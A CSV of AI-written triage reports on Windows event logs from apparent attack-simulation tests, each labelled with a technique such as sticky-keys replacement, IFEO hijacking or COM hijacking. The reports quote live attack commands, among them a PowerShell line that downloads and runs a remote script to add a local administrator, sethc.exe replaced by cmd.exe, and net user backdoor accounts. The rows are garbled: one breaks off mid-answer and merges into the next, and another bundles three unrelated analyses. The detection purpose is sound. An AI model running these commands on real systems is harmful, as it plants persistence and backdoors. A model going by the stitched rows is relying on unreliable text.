Directory Name,AI Response
COM Hijacking with RunDLL32 (Local Server Switch),"Upon analyzing the provided Windows event logs for potential malicious activity, a few aspects stand out that warrant concern and are indicative of possible compromise:

1. **Suspicious PowerShell Activity**:
   - The logs indicate several PowerShell commands being executed. Notably, PowerShell is used to modify the registry (`New-Item` and `New-ItemProperty` cmdlets) and run a DLL via `rundll32.exe`. The pattern and context—such as registry modification to include a suspicious directory path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.015_calc.dll`)—are characteristic of actions taken to establish persistence on a compromised system. This sequence supports the potential for malicious intent.

2. **Use of `Rundll32.exe`**:
   - The `rundll32.exe` process is executed with a handle to a suspicious CLSID, `{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}`, and appears to involve loading a DLL from a non-standard directory. The command line argument and the parent process being PowerShell further imply attempts to execute code under the guise of legitimate Windows operations, a common tactic for attackers.

3. **Execution of Common Windows Tools**:
   - Legitimate Windows binaries like `whoami.exe` and `hostname.exe` are executed around the same time, potentially indicating reconnaissance activity. While these events alone are not necessarily malicious, in the context of the identified PowerShell activity, they could be an attempt to gather system information post-compromise.

4. **High Integrity Level**:
   - The execution under a high integrity level (admin privileges) further suggests potential privilege escalation tactics usually associated with malicious actions.

No concrete evidence of a benign explanation or processes that correlate directly with standard IT operations justifies such registry persistence and DLL execution patterns via PowerShell. 

Given these observations, the activity logged significantly deviates from normal behavior or expected administrative tasks, thus suggesting a compromise with malicious intent is a strong possibility.

**Conclusion: MALICIOUS**

**Guidance**: 
- Isolate the system (`Server002`) immediately to prevent further lateral movement.
- Conduct a thorough investigation of the files and registry entries involved.
- Examine network logs and EDR alerts for further IOCs associated with similar patterns.
- Perform a full malware scan on the affected host and review endpoint protection logs.
- Reset credentials and increase monitoring of any associated user accounts.
- Assess any potential data breaches or sensitive information access related to this event.
- Consider restoring from a known good backup if malicious files or key system processes are altered."
IFEO Global Flags,"Upon analyzing the provided Windows event logs, here is a detailed assessment of the entries:

### Analysis:

1. **System Log:**
   - The entries in the System log primarily involve time adjustments using `svchost.exe`, which is typical behavior as `svchost.exe` manages Windows services, including time synchronization. The time changes are minor adjustments and are consistent with normal system operation.

2. **Security Log:**
   - The entries in the Security log show `svchost.exe` being involved in time change events. These are logged under standard `S-1-5-19`, which belongs to ""LocalService"", a standard Windows service account, indicating regular operations.

3. **Application Log:**
   - The entries regarding the `edgeupdate` service stopping are benign. Service stop events without accompanying errors often occur routinely or during updates or system shutdowns.

4. **Sysmon Log:**
   - Multiple processes including `wevtutil.exe`, `conhost.exe`, and `cmd.exe` are executed under the user `SERVER002\\admin_test`. These look like standard Windows utility executions.
   - **Command-line operations involving `cmd.exe` and `reg.exe`:** 
     - There are instances where `cmd.exe` executes commands to add registry entries under `Image File Execution Options` and `SilentProcessExit` for `notepad.exe`, with parameters to monitor processes using `cmd.exe`. This behavior is anomalous and resembles a persistence mechanism or configuration to hijack or monitor specific process executions. It is typically associated with malicious activity.
   - **Microsoft Edge Update Executions:**
     - Numerous entries related to `MicrosoftEdgeUpdate.exe` and its installations are visible, showing routine update operations. The presence of these logs does not by itself imply malicious activity as they are related to Microsoft Edge Update operations.

### Suspicious Indicators:
- **Unusual command-line arguments and registry modifications:**
  - The execution of `cmd.exe` with commands that modify registry settings to monitor and report process execution of `notepad.exe` is suspicious. This behavior can be used to alter the behavior of `notepad.exe` for malicious purposes or persistence.

### Conclusion:
- Based on the detailed analysis above, the logs do not contain clear signs of typical malicious payloads or operations. However, the exploitation of registry modifications targeting `notepad.exe` via `cmd.exe` indicates deviations from typical user behavior.
  
### Resolution:
- **SUSPICIOUS:** The identified registry manipulations are suspicious and warrant further investigation. It is advised to look into the context around these changes, auditing recent user activities, scripts, or new software installations that might have prompted these actions.

### Recommendations:
- Conduct a thorough review of recent user activities and any new software installations or scripts that could have invoked these registry changes.
- Validate the integrity and permissions settings around registry keys associated with `notepad.exe`.
- Monitor this system for any further unusual behavior or registry changes.
- If unexplained or unauthorized, consider isolating the host and conducting a detailed forensic analysis for potential compromise."
Bits download using desktopimgdownldr.exe (cmd),"Upon reviewing the provided Windows event logs, a detailed analysis reveals the following findings:

1. **Unusual Command-Line Usage**: The command line execution involving `desktopimgdownldr.exe` with the parameters `/lockscreenurl:https://raw.githubusercontent.com/file/file-file/master/files/data/data.md /eventName:desktopimgdownldr`, executed by `cmd.exe`, stands out as suspicious. The command attempts to change the system root and execute further commands which resemble downloading or communicating with an external source—a common method for downloading malicious payloads.

2. **Processes and Integrity Levels**: Multiple processes were executed under a high integrity level, which indicates they were run with elevated privileges. The processes of interest include `cmd.exe` and `desktopimgdownldr.exe`, potentially executed for malicious purposes. 

3. **Network Activities**: The event log does not detail any specific unusual network activities directly, but the suspicious use of command-line arguments to reach out to a GitHub URL is a red flag associated with potential command and control server communications or retrieving scripts/data.

4. **Repeated EdgeUpdate Executions**: The log shows numerous instances of `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, and related processes. While frequent updates and invocations of updates by such a service are somewhat usual, some inconsistencies, or malformed update execution arguments could indicate abuse for malicious intent, though it could also be typical update operations happening in sequence.

5. **Sysmon and Security Events**: The security and Sysmon logs mostly show typical service spawn and exit activities besides the outlier with `desktopimgdownldr.exe`. There are various benign service entries like `MicrosoftEdgeUpdate.exe`, which generally are valid for system update procedures but need correlating if constant high-frequency calls are happening.

**Assessment**: 
- The command seen with `desktopimgdownldr.exe` is highly anomalous and aligns with potentially unauthorized behavior, potentially indicating malicious activity or a compromised system state.
- EdgeUpdate related multiple events, by themselves, could be consistent with aggressive updating but need checking as overlays with other signals/logs.

**Guidance**: 
- Conduct an immediate containment and isolation of the system to prevent further potential damage or data breaches.
- Proceed with an in-depth forensic examination of communication to the specific URLs being accessed within commands.
- Validate the integrity of identified binaries and review related scheduled tasks and registry entries for persistence mechanisms.
- Investigate the origin of the suspicious command execution—whether it was user-driven or script-based.

**Resolution**: **MALICIOUS**
- The evidence, especially regarding the command-line invocation altering SYSTEMROOT, suggests intent to interfere with system operations in a potentially harmful manner. Further confirmation through deep analysis and external correlation is recommended, but enough indicators suggest a malicious action initiation."
Set Arbitrary Binary as Screensaver,"Upon analyzing the provided logs, I have identified the following details that stand out as suspicious and potentially malicious:

### Analysis:

1. **Process Executions and Command-Line Activity:**

   - There's a specific Sysmon Event ID 1 log for the execution of `cmd.exe` (ProcessId 5648) with a highly suspicious command line:
     - `cmd.exe /c reg export ""HKEY_CURRENT_USER\\Control Panel\\Desktop"" %%userprofile%%\\backup.reg & copy C:\\Windows\\System32\\cmd.exe ""%%SystemRoot%%\\System32\\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\\Control Panel\\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\\Control Panel\\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\\Control Panel\\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\\Control Panel\\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%%SystemRoot%%\\System32\\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0`
     - This command includes actions to export registry keys, manipulate screensaver settings, replace an executable (`evilscreensaver.scr`), and potentially shut down the system. These actions suggest an attempt to persist malicious code via a screensaver.

2. **Unauthorized PowerShell Activity:**
   - No PowerShell events were recorded, so there is no direct evidence of script execution in the logs provided, which needs further checking outside these logs considering the standard PowerShell usage by attackers.

3. **Privilege Escalation:**
   - The security event with ID 4672 indicates the subject `admin_test` was assigned a slew of privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` that allow manipulation of critical system and security settings.

4. **Use of `whoami.exe` and Other Administrative Tools:**
   - Multiple instances of `whoami.exe`, `conhost.exe`, and `wevtutil.exe` being executed close together may suggest reconnaissance activity to determine user privileges.

5. **User `admin_test`:**
   - The `admin_test` account appears to be initiating most suspicious activities. An analysis of its creation timeline, last logon, and any associated activities should be scheduled as it seems to be operating with high integrity and elevated privileges.

6. **Network Activity:**
   - Logon events indicate activity from `DESKTOP-3HL5B2P` with NTLM authentication, which requires validation to ensure it aligns with the organization’s approved devices.

7. **Software Protection Platform Service and Edge Update:**
   - The presence of EdgeUpdate activities is common but verifying the SHA256 hash for legitimacy can assure no tampering with legitimate processes.

### Conclusion:

The logs indicate suspicious and potentially malicious activity, particularly around the manipulation of registry settings related to the screensaver, which can be used as a persistence mechanism to execute unauthorized scripts or malware. The actions of copying executables and killing processes suggest an attempt to hijack or interfere with system operations.

### Resolution:
**MALICIOUS**

### Recommended Actions:

- Immediately isolate the system `Server002` to prevent potential spread.
- Conduct a thorough malware scan using up-to-date antivirus definitions on `Server002`.
- Engage incident response to conduct a deeper forensic analysis.
- Check for unauthorized user accounts and unusual privilege assignments, especially around `admin_test`.
- Review logs from adjacent systems and network devices for correlated activity.
- Verify the integrity and legitimacy of all custom or non-standard scripts and application configurations.
- Reset credentials for any privileged accounts, especially `admin_test`.
- Implement security patches and system updates to mitigate vulnerabilities.
  
### Further Guidance:

Persistence using automatic execution of custom DLL during RDP session,"Upon thoroughly analyzing the provided logs, several points of interest emerge:

1. **Login and Privilege Escalation:**
   - The user ""admin_test"" logs in with high privileges (Event ID 4672). The privileges listed are extensive, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be utilized for nefarious actions.
   - A network logon (Logon Type 3) occurs using NTLM authentication, which can raise concern if this method isn't typical for credential use policy on the network.

2. **System Time Change:**
   - There are events indicating a system time change (Event ID 1, Kernel-General). Although this can sometimes occur for legitimate reasons involving time synchronization, unsanctioned time adjustments can be a tactic to evade certain time-based security mechanisms or logs analysis.

3. **Suspicious Command Execution:**
   - A command prompt (`cmd.exe`) executes a registry modification (`reg.exe`) to add a potentially suspicious DLL path (`amsi.dll`) to the Terminal Server configuration, which may point towards an attempt to establish persistence or modify system behavior.

4. **Use of Sysmon:**
   - The frequent invocation of `wevtutil.exe` and `conhost.exe` by ""admin_test"" could indicate attempts to query or manipulate event logs, a common post-compromise action to cover tracks.
   - Execution of diagnostic tools like `whoami.exe` and `hostname.exe`, while common in many usages, might be seen in malicious scenarios if attacked by unauthorized users attempting to gather system/user information.

5. **Software Installation Activities:**
   - The logs reflect activities related to Microsoft Edge update/installation processes (`MicrosoftEdgeUpdate.exe` and associated executables). These activities largely appear routine and executed under NT AUTHORITY\SYSTEM, which is standard for legitimate software updates.

Considering the above points:

- **Login and Privileges:** While the elevated privileges used are concerning, they might be customary for the ""admin_test"" account if it is a system administrator. However, privilege escalation deserves careful review.
- **Time Change:** Needs validation against authorized changes, especially in the context of detecting possible tampering or evasion.
- **Registry Modification Attempt:** The modification attempt is a red flag and indicative of potential malicious intent, especially without prior notice or legitimate application function.
- **Overall Behavior:** While the login and some process executions might pass as benign under standard administrative activities, the registry modification suggests a more deliberate attempt to control or manipulate system settings.

**Assessment and Resolution:**

Considering all analyzed behaviors, the activity logged, particularly the registry modification attempt, and unsanctioned system time change, leads us to conclude the following resolution: 

- **SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation. The concerning evidence requires a detailed follow-up, especially validating the legitimacy of admin activities and any potential unauthorized registry changes or system behavior modifications."
Create a new Windows admin user via .NET,"Upon analyzing the Windows event logs provided, I have identified several indicators of potentially malicious activity. Here is a detailed analysis of the logs:

1. **PowerShell Activity**: 
   - The Windows PowerShell logs contain entries showing usage of the command `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/.../Persistence/CreateNewLocalAdmin_ART.ps1')}`. This command is used to execute a script downloaded from an external URL, which is a common technique used in PowerShell-based attacks, often referred to as ""Living off the Land"" (LotL). The script mentioned in the URL aims to create a new local administrator account, suggesting a privilege escalation attempt.

2. **Security Audit Logs**: 
   - Event logs with Event ID 4720 indicate the creation of a new user account named `NewLocalUser` by `admin_test`. 
   - Event ID 4728 indicates the addition of this new user to the ""Administrators"" group, which provides administrative privileges. 
   - The logs also show accounts being enabled and modifications done to their settings shortly after creation, suggesting rapid privilege escalation actions.

3. **Sysmon Logs**:
   - Entries in the Sysmon logs show execution of `net.exe` and `net1.exe` with command lines that match typical administrative actions to add or change user accounts. The fact that these commands were executed in close succession to the PowerShell commands is suspicious and indicative of malicious activity.
   
4. **Time Changes**:
   - There are multiple entries in the System and Security logs related to time changes on `Server002`. While not directly indicative of malicious activity, time manipulation can be used by attackers to cover tracks by causing logs to appear out of order or confusing incident timelines.
   
In summary, the logs show evidence of potentially malicious PowerShell script execution aimed at creating new local admin accounts, followed by user account manipulations using command-line tools. These activities fit patterns of an attacker attempting to gain persistent elevated privileges on the system.

Given the findings, the assessment for the logs is **MALICIOUS**.

### Guidance on How to Proceed:
- **Immediate Action**: Isolate `Server002` from the network to prevent any lateral movement or data exfiltration.
- **Password Reset**: Reset passwords for all accounts, especially those with administrative privileges.
- **Audit and Removal**: Audit new accounts and any recent changes, especially `NewLocalUser`, and remove unauthorized accounts or memberships in admin groups.
- **Forensic Analysis**: Conduct a deeper forensic analysis to understand the full scope of the breach.
- **Review Network Traffic**: Analyze network traffic logs for anomalous outbound connections, especially to the domain 'raw.githubusercontent.com'.
- **Patch Systems**: Ensure all systems are properly patched and evaluate security settings to block potentially dangerous PowerShell execution scenarios.
- **User Education**: Conduct training to make users aware of phishing attacks and potentially malicious PowerShell usage.

Upon thorough examination of the provided event logs, I have identified multiple indications of potential compromise:

1. **Suspicious User Account Creation and Privilege Escalation**:  
   - There are multiple Sysmon event log entries indicating the execution of commands to add a new user account (`data.001_Admin`) and add it to the local administrators group. The specific events involve the following:
     - **Sysmon EventID 1 with cmd.exe**: Command `""cmd.exe"" /c net user /add ""data.001_Admin"" ""data_pass"" & net localgroup administrators ""data.001_Admin"" /add` suggests scripting of unauthorized user account creation and elevation of privileges.
     - **Security Log Events**:
       - EventID 4720 indicates the creation of a new user account named `data.001_Admin`.
       - EventID 4728 and 4732 show that this account was added to the built-in 'Users' and 'Administrators' groups.

2. **Process Creations**:  
   - A series of processes were spawned in a very short time frame involving `conhost.exe`, `net.exe`, and `HOSTNAME.EXE`. This behavior is typically associated with scripted or automated attacks.
   - **Sysmon EventID 5** entries show unusual activities involving `wevtutil.exe` and `conhost.exe`, which are commonly used for log manipulation and running hidden command prompts respectively.

3. **Elevated Integrity Levels and High Privilege Use**:  
   - Multiple instances demonstrate high integrity levels indicating actions were performed with elevated privileges without a clear legitimate purpose. EventID 4672 logs the use of various significant privileges by `SYSTEM` and other potentially unauthorized applications.

4. **Time Discrepancies and Changes**:  
   - Logs show time changes through the Kernel and Time Service events.
   - **System Event Log** (EventID 1 and 24 under Kernel-General) indicate time resets, possibly due to remediation actions, or attempts to hide actions taken during the logged period.

5. **Host Processes**:  
   - Surges in host processes and utilities like `taskhostw.exe` executed by `NT AUTHORITY\SYSTEM` could indicate stealthy background tasks initiated by malware or adversaries.

### Assessment of the Situation

- The execution of commands to add a new account along with privilege escalation is a clear breach of standard security policies, indicating unauthorized changes to user management.
- Anomalies like command-line actions for critical functions combined with process duplication and rapid execution suggest scripted attacks.
- Time adjustments potentially point towards an attempt to obfuscate event timestamps related to the malicious activity.

### Risks and Recommendations

**Threat Level**: HIGH

- **Resolution**: **MALICIOUS**
  - Due to the illicit creation and elevation of a user account, combined with scripted activity indicating potential automation of an attack, these logs imply a high risk of compromise.
  
**Recommended Next Steps**:
1. **Immediate Isolation**: Disconnect Server002 from the network to contain any active threats.

### Suspicious and Anomalous Activity:

1. **Registry Modification via Command Line:**
   - **EventID 17980:** The command line used was `""cmd.exe"" /c REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe"" /v Debugger /d ""C:\Windows\System32\cmd.exe""`.
   - This indicates the modification of the Image File Execution Options (IFEO) in the Windows registry, which is often leveraged by malware to hijack legitimate applications for privilege escalation or persistence.

2. **Execution Pattern of System Utilities with High Integrity:**
   - There are multiple instances of standard Windows utilities like `hostname.exe`, `whoami.exe`, and `cmd.exe` executed with high integrity, which might indicate privilege approval for standard operations. However, the context and sequence of these executions, especially involving `cmd.exe`, raise concerns as they are executed by the `admin_test` user with high integrity level.

### Indicators of Potential Malicious Activity:

- **EventID 17982:** The operation `""REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe"" /v Debugger /d ""C:\Windows\System32\cmd.exe""` is especially concerning because it intended to replace the execution of `calc.exe` with `cmd.exe`. Such behavior is often used for executing other commands silently under the guise of running a legitimate application.

### Assessment:

Based on the analysis of registry modifications, the use of command line to manipulate execution options, execution patterns of command-line utilities, and the administrative level of the user executing these commands, the activity within the logs is deemed suspicious. These factors are typical techniques used in malicious actions and warrant further investigation despite the lack of direct evidence of malware or an ongoing attack.

### Resolution:

**SUSPICIOUS**: The activities recorded in the logs indicate unusual behavior and registry manipulation strategies often associated with malware. Further investigation, including a comprehensive security scan of the registry and affected files, monitoring for unusual activities, and verification of administrative actions executed by the `admin_test` user, is necessary to rule out malicious intent.

### Guidance:

1. **Immediate Steps:**
   - Perform an antivirus and antimalware scan to detect any potential threats that might have used the IFEO registry tweak.
   - Review system policies and user activities to identify why such registry changes were authorized or possible.

2. **Long-term Measures:**
   - Implement additional monitoring for unauthorized registry changes.
   - Conduct routine audits of privileged user activities to ensure alignment with security policies.
   - Strengthen access controls around registry modifications.

These steps should help to secure the system against potential threats and improve the overall security posture."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"**Analysis Summary**

Upon reviewing the provided Windows event logs from Server002, several events require further examination to determine their nature, particularly concerning potential malicious activity involving PowerShell execution.

**Suspicious or Anomalous Behavior:**

1. **PowerShell Command Execution:**
   - An event with a PowerShell command was observed where a script was run to create a registry entry in `HKCU:\Software\Microsoft\Command Processor`, setting the `AutoRun` value to `notepad.exe`. This action suggests an intention to use an autostart mechanism, which is often associated with persistence methods used by malware or attackers to execute a process automatically with system or user logon.

2. **Privileged Logon and Elevated Token Events:**
   - The logs reveal numerous logon events for the `admin_test` user with privileges indicating administrative rights (Event ID 4672). This is typical for an admin account,, however, given the other suspicious activity, it merits review in case of misuse.

3. **Registry Manipulation Through PowerShell:**
   - The PowerShell event logs display a script that uses New-Item and New-ItemProperty cmdlets, commonly used for manipulating registry keys and values. This particular script's intent seems benign—launching `notepad.exe`—but the method is unconventional outside of administrative scripts, leading to suspicion without context.

**Indicators of Malicious Activity or Compromise:**

- The standout indication of potentially malicious activity is the PowerShell script that modifies the Command Processor’s AutoRun registry key. While `notepad.exe` is not malicious per se, the method of execution and goal of persistence raise red flags that suggest this could be a precursor action or misdirection employed by malicious actors.

**Assessment and Recommendations:**

**Resolution: SUSPICIOUS**

- **Threats/Risks Identified:**
  - Potential unauthorized use of PowerShell to maintain persistence by modifying the registry.
  - Administrative-level privileges being used for actions that could align with tactics used by attackers to remain undetected.

- **Guidance on How to Proceed:**
  1. **Investigate the User Account:** Review the `admin_test` account for unusual activity, ensuring it hasn't been compromised.
  2. **Log Review and User Interviews:** Check for other signs of illicit activity around the time of these events. Interviews may help determine if legitimate administrative scripts are in use.
  3. **Registry Inspection:** Confirm whether any unintended or unauthorized changes have occurred to registry keys, especially under the `Command Processor`.
  4. **PowerShell and Sysmon Policy Revision:** Increase logging and review categorization rules to capture detailed script blocks and command history in PowerShell. Apply policy to ensure script origin and execution policies are maintained to prevent rogue scripts.
  5. **Monitor Network Traffic:** Track any unusual network traffic that might suggest communication with an external attacker. Focus on IP addresses seen in logon events.

The identified activity is suspicious but not definitively malicious based on the available logs. Further examination and context are required to substantiate any potential compromise or malicious behavior confidently."
Create a new user in a command prompt,"Upon analyzing the provided log entries, the following key events and indicators of suspicious activities have been identified:

### Identified Suspicious Activities:

1. **Time Change Events**:
   - Event IDs 4616, 1 in Security and System logs show a system time change initiated by `svchost.exe`, a legitimate system process often targeted by malicious actors to alter system times to evade detection, logs, or trigger certain time-based commands/malware.

2. **High Privileges and Account Manipulation**:
   - Event ID 4672 indicates the `admin_test` user was granted several high-level privileges such as `SeDebugPrivilege`, which are often sought after by attackers for lateral movement and system control.
   - Event IDs 4720 and 4722 in the Security log indicate the creation and enabling of the ""data.001_CMD"" account by `admin_test`, an unexpected username indicating potential malicious intent or account creation by a legitimate user for testing purposes.
   - Event ID 4738 signals modification of this account shortly after its creation.

3. **Unusual Command Execution**:
   - Sysmon events showing execution of `cmd.exe` with a command line adding a user account (`net user /add ""data.001_CMD"" ""data.001_CMD!""`). This activity is highly indicative of a malicious actor creating a backdoor account to gain persistent access.

4. **Executable and PowerShell Utilization**:
   - Multiple `wevtutil.exe` and `conhost.exe` launches by `admin_test` noted in the Sysmon log around the time of these activities. These could potentially be misused during forensic cleaning or log manipulation.

5. **Network Connections**:
   - Logon events (4624) show network logon types (""LogonType 3""), indicating possible remote connections or lateral movement.

### Assessment:

- **Suspicion of Unauthorized Access and Persistence Mechanism**:
  Based on the above observations, there are significant indicators of potentially malicious activity. The unauthorized creation of a user account, combined with privilege escalation and suspicious command execution, strongly suggests an attempt to establish persistent access or conduct further unauthorized actions on the system.

### Recommendation & Resolution:

- **Resolution: MALICIOUS**
  Given the nature of the account creation, privilege escalation, and suspicious command execution, the behavior logged is highly indicative of malicious intent.

**Immediate Action Steps:**
- Conduct an immediate review and reset high-privilege accounts and passwords.
- Isolate the affected host to prevent lateral movement within the network.
- Perform a thorough forensic investigation on the `Server002` system to determine any further indicators of compromise.
- Consider potential incident response measures, including notifying relevant stakeholders and reviewing access logs for further unauthorized activities.

The behaviors and activities noted within the logs warrant strong concern for a breach or unauthorized access attempt and must be addressed promptly to safeguard the network's integrity."
Replace binary of sticky keys,"### Detailed Analysis of Logs:

**Suspicious or Anomalous Activities:**

1. **Process Execution:**
   - There is a significant command run by `cmd.exe` which is suspicious: 
     - `""cmd.exe"" /c IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (...) copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe`
   - This command replaces the sticky keys executable (`sethc.exe`) with the command prompt (`cmd.exe`). This is a known technique often used to create a backdoor. When the shift key is pressed multiple times (for Sticky Keys), it can allow an unauthorized user to gain system-level access without logging in.
   
2. **Wevtutil and Conhost Activity:**
   - There are numerous executions of `wevtutil.exe` and `conhost.exe`. Wevtutil is a command-line tool that lets you retrieve information about event logs and publishers. This sudden burst of activity around `wevtutil.exe` may signify an attempt to manipulate, gather or erase event logs, possibly to hide tracks.

3. **Privilege Escalation:**
   - The command-line execution under `cmd.exe` (as mentioned above) is an attempt of privilege escalation as it aims to get administrative rights on files critical to the system's security (sethc.exe).

**Benign Actions:**

- Most other activities, such as those related to Microsoft Edge updates, appear typical and benign, with processes running under `NT AUTHORITY\SYSTEM`.

### Assessment of Situation:

Based on the analysis of the logs, the detection of a known malicious technique involving the replacement of `sethc.exe` with `cmd.exe` presents a strong indicator of attempted compromise. This action indicates an attempt to gain unauthorized access using a method widely recognized in hacking attempts for privilege escalation.

### Threat or Risk Identified:

- **Risk:** High likelihood of unauthorized access by leveraging the sticky keys exploit, indicating an attempt at privilege escalation and potential system compromise.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Terminate the process that initiated the sticky keys replacement if it is still active.
   - Check for any unauthorized account creations or privilege escalations on the system.

2. **Investigate Further:**
   - Review the recent activity on the host for any unknown sessions or changes.
   - Secure the machine from the network to prevent any further unauthorized access.
   - Revert changes made to `sethc.exe` and verify the integrity of the Windows system files.

3. **Preventive Actions:**
   - Implement monitoring to detect this pattern of activity in the future.
   - Educate system administrators and users about this kind of attack.
   - Apply security patches and review access control settings.

### Resolution:

- **MALICIOUS:** The logs contain activity that is 100% indicative of malicious intent, especially the manipulation of the `sethc.exe` file aimed at creating a privilege escalation backdoor.
"
Code Executed Via Excel Add-in File (XLL),"Upon analyzing the provided Windows event logs, here is the detailed analysis based on observed activities and indicators:

### Findings:

1. **Logon Events (Event ID 4624, 4672):**
   - Multiple logon events (Event ID 4624) occurred involving the `SYSTEM` account with logon type 5 (a service logon), which is standard for system operations.
   - Event ID 4672 indicates that special privileges were assigned. While this is expected for system processes, it requires attention when occurring frequently or in conjunction with other suspicious activity.

2. **Privileged Account Enumeration (Event ID 4798):**
   - These events indicate enumeration-related activities on accounts like `Administrator`, `admin_test`, `Guest`, and others. Although frequent enumeration might suggest reconnaissance, it could also be due to routine system tasks or software inventory updates.

3. **Failed Credential Access (Event ID 5379):**
   - Consistent failed attempts to access credentials for a Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`) and others stand out. A return code of 3221226021 (STATUS_NO_SUCH_LOGON_SESSION) points to an invalid session or a potentially malicious attempt to access account information.

4. **Process Creation (Sysmon Event ID 1 & 5):**
   - The logs show several occurrences of PowerShell executions with suspicious command lines that include PowerShell creating COM Objects and attempts to load XLL files, which is characteristic of malicious activities often seen in Excel application abuse.
   - The presence of multiple `conhost.exe`, `wevtutil.exe`, and other system processes executed by `admin_test` user raises suspicion, particularly if these processes are running with unusual arguments or outside standard administrative tasks.
   - `MicrosoftEdgeUpdate.exe` and related processes executing various update commands may relate to legitimate software updates, but could also be leveraged for living off the land techniques by malware.

5. **Unusual Command Usage:**
   - PowerShell usage in the logs includes the execution of scripts that seem to manipulate Excel through COM. This pattern aligns with malware behavior that targets applications for execution of payloads via legitimate software.

### Assessment:

The evidence in the logs, such as unusual PowerShell command execution and credential enumeration without proper contexts, suggests suspicious activity on this host.

### Conclusion:

**Resolution: SUSPICIOUS**

The activity on `Server002` is suspicious due to multiple indicators of potentially unauthorized account enumeration, unusual PowerShell execution, and failed credential access attempts. These warrant further investigation to rule out or confirm potential threats. It is advisable to perform the following:

1. **Immediate Investigation:**
   - Investigate the origin and intent of PowerShell scripts executed and inspect if these align with expected administrative activities.
   - Review account enumeration and credential access attempts in closer detail, especially logs associated with `MicrosoftAccount:user=02txoixylodcstop`.

2. **Network Inspection:**
   - Check network activity during the time of these logs for connections to suspicious domains or IP addresses.

3. **User Verification:**
   - Verify recent activities from the account `admin_test` for any anomalies or unauthorized actions.

4. **System Review:**
   - Conduct a malware scan focusing on scripts and unusual binaries created during the events.

By adopting these measures, any malicious intent can be confirmed and mitigated effectively."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"## Analysis

The provided logs contain several entries indicating potentially malicious activity, primarily revolving around the use of PowerShell scripts and their execution. Here are the key observations from the logs:

### Key Observations

1. **PowerShell Execution**:
   - **Event ID 1072-1075** in the Windows PowerShell log show the execution of a PowerShell script that modifies a registry key associated with allowing access to the VBA project object model in Microsoft Word. This kind of activity is typically associated with attempts to abuse Office macros for malicious purposes.
   - The script is changing the registry value of `AccessVBOM` to `1`, which can indicate an attempt to enable macro execution without user intervention. This is a common technique used by attackers to execute malicious code via Office applications.

2. **Suspicious Commands**:
   - The PowerShell script also attempts to schedule a task using `schtasks` to open the Calculator application (`calc.exe`) at a specific time (`8:04 pm daily`). While opening the calculator itself is benign, using a scheduled task to automate actions is a tactic often used to establish persistence or trigger payloads at a set time.

3. **VBA Macro Injection**:
   - The PowerShell script further involves creating a VBA macro within a Word document using `Word.Application`. The macro's functionality includes scheduling tasks through commands, potentially indicating the execution of further payloads when Word is opened.

4. **Usage of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` across the logs. While they can be legitimate processes, repeated, nearly simultaneous executions often warrant further investigation as they could be part of process hollowing or process injection strategies.

5. **No Security Log Entries**:
   - There is no information present in the security logs, which can sometimes itself be suspicious if events have been tampered with or deleted. However, in this context, it may be a missing element from the logs provided for analysis.

### Assessment

Based on the detailed analysis of logs, the activities observed are highly suspicious and align with tactics commonly seen in malware or unauthorized scripting attempts within an organization's network. There is definitive misuse of legitimate tools like PowerShell to attempt changes to system configurations and behaviours indicative of initial stages of compromise.

### Resolution: **MALICIOUS**

This analysis concludes that the reviewed logs reflect malicious activities. The combination of PowerShell script execution, registry modifications to permit macros, persistence mechanisms through task scheduler, and suspicious process behavior suggests an active compromise or attempted intrusion.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Isolate the affected host (Server002) from the network to prevent lateral spread and further damage.
   
2. **Detailed Investigation**:
   - Conduct deeper forensic analysis to identify any residual malware and determine the full scope of the compromise.
   - Analyze network traffic for any outbound connections related to suspicious activities observed in the logs.

3. **Registry and Task Scheduler Audit**:
   - Check and verify critical registry keys and configurations changed by the script.
   - Audit task scheduler for any suspicious or unauthorized tasks.

4. **System and Security Logs Review**:
   - Ensure system and security logs are proactively monitored and not tampered with. Recover and examine any additional logs if possible.

5. **User Awareness and Security Posture Enhancement**:
   - Inform users, especially those in role of 'admin_test', about safe PowerShell usage and potential threats.
   - Review and reinforce security policies, including executing scripts and macros, and incorporate additional endpoint protection measures.
   
6. **Patch and Update Systems**:
   - Ensure all systems are up-to-date with the latest security patches and vulnerability mitigations.

This approach is critical to prevent further exploitation and to enhance the overall security posture."
Simulate Patching termsrv.dll,"Upon examining the provided logs, a repeated and concerning pattern emerges centered around the execution of unauthorized and potentially harmful commands using PowerShell. The following points summarize the critical observations and their implications:

1. **PowerShell Activity:**
   - A PowerShell command is executed that modifies the access control list (ACL) of the `termsrv.dll` file, which is a key component of the Remote Desktop Services. The command grants full control to the ""Administrators"" group and attempts to manipulate the termsrv.dll by creating a backup and substituting its contents. This behavior aligns with techniques used to bypass licensing constraints or modify behavior in Remote Desktop Services, potentially enabling multiple Remote Desktop sessions.
   - The execution and modification of system files like `termsrv.dll` using PowerShell, especially in a directory associated with system services and executed by a user with elevated privileges, is highly suspicious.

